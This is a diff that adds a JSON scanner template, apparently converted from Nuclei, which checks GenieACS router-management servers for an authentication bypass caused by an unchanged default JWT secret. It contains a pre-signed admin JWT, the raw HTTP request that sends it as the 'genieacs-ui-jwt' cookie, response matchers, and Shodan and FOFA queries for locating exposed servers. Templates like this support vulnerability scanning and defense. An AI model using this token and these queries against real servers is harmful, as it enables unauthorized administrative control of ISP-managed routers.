@@ -1,0 +1,195 @@
+{
+  "id": "genieacs-default-jwt",
+  "name": "GenieACS - Authentication Bypass (Default JWT Secret)",
+  "author": "DhiyaneshDK,pussycat0x",
+  "severity": "HIGH",
+  "description": "GenieACS, an Auto Configuration Server (ACS) for TR-069 enabled routers and similar devices, is vulnerable to authentication bypass due to the use of a default JWT secret. During installation, if the default JWT secret \"secret\" is not changed, an attacker can create a JWT token, sign it, and use this token to log into the GenieACS UI interface. The attack is carried out by setting a cookie named \"genieacs-ui-jwt\" with its value being the JWT token.\n",
+  "references": [
+    "https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738"
+  ],
+  "tags": [
+    "misconfig",
+    "jwt",
+    "genieacs",
+    "default-jwt"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"genieacs\" icon_hash\u003d-2098066288",
+    "shodan": "http.html:\"genieacs\" http.favicon.hash:-2098066288"
+  },
+  "variables": {
+    "default_jwt_secret": [
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c"
+    ],
+    "cookie_name": [
+      "genieacs-ui-jwt"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-798",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /api/presets/?filter\u003dtrue HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/*\nCookie: {{cookie_name}}\u003d{{default_jwt_secret}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"provision\":",
+            "\"provisionArgs\":"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "application/json"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "genieacs-default-jwt",
+    "info": {
+      "name": "GenieACS - Authentication Bypass (Default JWT Secret)",
+      "author": "DhiyaneshDK,pussycat0x",
+      "severity": "high",
+      "description": "GenieACS, an Auto Configuration Server (ACS) for TR-069 enabled routers and similar devices, is vulnerable to authentication bypass due to the use of a default JWT secret. During installation, if the default JWT secret \"secret\" is not changed, an attacker can create a JWT token, sign it, and use this token to log into the GenieACS UI interface. The attack is carried out by setting a cookie named \"genieacs-ui-jwt\" with its value being the JWT token.\n",
+      "reference": [
+        "https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738"
+      ],
+      "classification": {
+        "cwe_id": "CWE-798"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": [
+          "http.html:\"genieacs\"",
+          "http.favicon.hash:-2098066288"
+        ],
+        "fofa_query": [
+          "body\u003d\"genieacs\"",
+          "icon_hash\u003d-2098066288"
+        ]
+      },
+      "tags": "misconfig,jwt,genieacs,default-jwt"
+    },
+    "variables": {
+      "cookie_name": "genieacs-ui-jwt",
+      "default_jwt_secret": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /api/presets/?filter\u003dtrue HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/*\nCookie: {{cookie_name}}\u003d{{default_jwt_secret}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"provision\":",
+              "\"provisionArgs\":"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "application/json"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ],
+        "extractors": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "\"JWT Secret 👉 \" + cookie_name + \"\u003d\" + default_jwt_secret"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
